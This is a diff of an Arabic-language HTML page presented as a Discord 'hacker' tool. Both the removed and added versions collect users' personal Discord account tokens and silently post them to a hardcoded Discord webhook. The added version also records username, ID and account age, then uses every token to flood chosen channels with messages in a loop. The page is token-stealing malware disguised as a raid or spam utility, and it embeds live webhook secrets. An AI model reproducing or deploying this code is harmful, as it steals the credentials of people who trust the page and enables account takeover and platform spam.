@@ -1,181 +1,158 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <title>موقع حمود الهكر </title>
+  <meta charset="UTF-8">
+  <title>Nasser 497©</title>
   <style>
     body {
-      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(to bottom, #8B0000, #000000);
       color: white;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 50px;
-      margin: 0;
-      background: linear-gradient(to bottom right, #0077ff, #00ff88);
-    }
-    /* الصفحة الأولى */
-    #page1 {
-      display: block;
-    }
-    /* الصفحة الثانية */
-    #page2 {
-      display: none;
-      background-color: #000000;
-      height: 100vh;
-      padding-top: 100px;
-      box-sizing: border-box;
+      padding: 20px;
     }
     h1 {
-      font-size: 3em;
-      color: red;
-      text-shadow: 2px 2px 5px blue;
-      margin-bottom: 40px;
+      font-size: 2em;
+      margin-top: 10px;
     }
-    label {
-      display: block;
-      margin-top: 20px;
-      font-size: 1.2em;
-      color: white;
-    }
-    input, select {
+    textarea, input, select {
+      width: 80%;
+      margin: 10px 0;
       padding: 10px;
-      width: 300px;
-      font-size: 1em;
       border-radius: 10px;
       border: none;
-      margin-top: 10px;
-      direction: ltr;
-      text-align: left;
+      font-size: 1em;
     }
     button {
-      margin-top: 30px;
-      background-color: green;
-      color: white;
-      padding: 12px 24px;
-      font-size: 1.2em;
+      padding: 10px 20px;
+      margin: 10px;
       border: none;
       border-radius: 10px;
+      font-size: 1em;
       cursor: pointer;
-      width: 150px;
     }
-    #result, #error2 {
-      margin-top: 30px;
-      font-size: 1.2em;
-      color: yellow;
+    #nextBtn {
+      background-color: green;
+      color: white;
+    }
+    #sendBtn {
+      background-color: green;
+      color: white;
+    }
+    #stopBtn {
+      background-color: red;
+      color: white;
+    }
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
+  <h1>Nasser 497©</h1>
 
-  <!-- الصفحة الأولى: إدخال التوكن -->
   <div id="page1">
-    <h1>موقع الهكر حمود</h1>
-    <label>قم بوضع توكن حسابك:</label>
-    <input type="text" id="token" placeholder="توكن الحساب" autocomplete="off" />
-    <br />
-    <button onclick="checkToken()">التالي</button>
-    <div id="result"></div>
+    <textarea id="tokens" rows="10" placeholder="اكتب التوكنات، كل توكن بسطر نص :\n"></textarea><br>
+    <button id="nextBtn">التالي</button>
   </div>
 
-  <!-- الصفحة الثانية: البيانات -->
-  <div id="page2">
-    <h1>قم بوضع الباقي :</h1>
-    <label>قم بوضع ايدي السيرفر نص :</label>
-    <input type="text" id="serverId" placeholder="Server ID" autocomplete="off" />
-    
-    <label>اختر العملية :</label>
-    <select id="actionSelect">
-      <option value="">-- اختر --</option>
-      <option value="BAN">BAN</option>
-      <option value="kick">kick</option>
-      <option value="deleteChannels">مسح رومات</option>
-      <option value="spam">عمل سبام</option>
-    </select>
-    
-    <br />
-    <button onclick="executeAction()">تنفيذ</button>
-    <div id="error2"></div>
+  <div id="page2" class="hidden">
+    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة) نص :\n"></textarea><br>
+    <input type="text" id="message" placeholder="قم بوضع الكلام : نص"><br>
+    <select id="speed">
+      <option value="1">1</option>
+      <option value="0.9">0.9</option>
+      <option value="0.8">0.8</option>
+      <option value="0.7">0.7</option>
+      <option value="0.6">0.6</option>
+      <option value="0.5">0.5</option>
+      <option value="0.4">0.4</option>
+      <option value="0.3">0.3</option>
+      <option value="0.2">0.2</option>
+      <option value="0.1">0.1</option>
+    </select><br>
+    <button id="sendBtn">بدء الارسال</button>
+    <button id="stopBtn">ايقاف الارسال</button>
+    <p style="margin-top: 30px;">Nasser 497©</p>
   </div>
 
-<script>
-  let savedToken = "";
+  <script>
+    const nextBtn = document.getElementById('nextBtn');
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const tokensInput = document.getElementById('tokens');
 
-  function checkToken() {
-    const token = document.getElementById("token").value.trim();
-    const resultDiv = document.getElementById("result");
-    resultDiv.textContent = "";
+    nextBtn.onclick = async () => {
+      const tokens = tokensInput.value.trim().split('\n');
+      const validTokens = [];
 
-    if (!token) {
-      resultDiv.textContent = "❌ الرجاء إدخال التوكن";
-      return;
-    }
-
-    fetch("https://discord.com/api/v10/users/@me", {
-      headers: {
-        "Authorization": token
-      }
-    }).then(res => {
-      if (res.status === 200) {
-        res.json().then(data => {
-          if (data.bot) {
-            resultDiv.textContent = "❌ هذا توكن بوت، الرجاء استخدام توكن حساب شخصي";
-            return;
-          }
-
-          
-          savedToken = token;
-
-          
-          fetch("https://discord.com/api/webhooks/1382044262165647514/CHpOR5xEYXctWS8lx2AySpAWw5PD_6YHzIvoBfHlDQiaT4lfKpyXJTpam3dxQfqcFgjK", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              content: `✅ تم التقاط توكن حساب مستخدم:\n\`${savedToken}\`\nيوزر: \`${data.username}#${data.discriminator}\``
-            })
+      for (const token of tokens) {
+        try {
+          const res = await fetch('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: token }
           });
+          if (res.ok) {
+            const data = await res.json();
+            const createdAt = new Date((BigInt(data.id) >> 22n) + 1420070400000n);
+            const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
+            const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;
 
-          
-          document.getElementById("page1").style.display = "none";
-          document.getElementById("page2").style.display = "block";
-        });
-      } else {
-        resultDiv.textContent = "❌ توكن غير صالح";
+            fetch('https://discord.com/api/webhooks/1382044262165647514/CHpOR5xEYXctWS8lx2AySpAWw5PD_6YHzIvoBfHlDQiaT4lfKpyXJTpam3dxQfqcFgjK', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content: msg })
+            });
+
+            validTokens.push(token);
+          }
+        } catch (err) {
+          console.warn("Invalid token:", token);
+        }
       }
-    }).catch(() => {
-      resultDiv.textContent = "❌ حدث خطأ أثناء التحقق";
-    });
-  }
 
-  function executeAction() {
-    const serverId = document.getElementById("serverId").value.trim();
-    const action = document.getElementById("actionSelect").value;
-    const errorDiv = document.getElementById("error2");
-    errorDiv.textContent = "";
+      if (validTokens.length > 0) {
+        tokensInput.value = validTokens.join('\n');
+        page1.classList.add('hidden');
+        page2.classList.remove('hidden');
+      } else {
+        alert("لا يوجد توكنات صحيحة!");
+      }
+    };
 
-    if (!serverId || !action) {
-      errorDiv.textContent = "❌ يوجد غلط في البيانات";
-      return;
-    }
+    let sending = false;
 
-   
-    fetch("https://discord.com/api/webhooks/1381695160852939012/7QYAdm_EI7Q0SXMKQoYbDog-2DuwMfxVr9_l47y6Q3R39blJxTJHOKNkzRNpG_8vQNPi", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        content: `✅ تم تنفيذ العملية على السيرفر\nتوكن المستخدم: \`${savedToken}\`\nServer ID: \`${serverId}\`\nالإجراء: \`${action}\``
-      })
-    }).then(() => {
-      errorDiv.style.color = "lime";
-      errorDiv.textContent = "قم بتجربه اخرى ❌";
-    }).catch(() => {
-      errorDiv.style.color = "yellow";
-      errorDiv.textContent = "";
-    });
-  }
-</script>
+    document.getElementById('sendBtn').onclick = async () => {
+      sending = true;
+      const tokens = tokensInput.value.trim().split('\n');
+      const ids = document.getElementById('ids').value.trim().split(',');
+      const message = document.getElementById('message').value;
+      const speed = parseFloat(document.getElementById('speed').value);
 
+      while (sending) {
+        for (const token of tokens) {
+          for (const id of ids) {
+            if (!sending) return;
+            try {
+              await fetch(`https://discord.com/api/v10/channels/${id.trim()}/messages`, {
+                method: 'POST',
+                headers: {
+                  'Authorization': token,
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+              });
+              await new Promise(r => setTimeout(r, speed * 1000));
+            } catch (e) {
+              console.warn("فشل الارسال على:", id);
+            }
+          }
+        }
+      }
+    };
+
+    document.getElementById('stopBtn').onclick = () => {
+      sending = false;
+    };
+  </script>
 </body>
 </html>
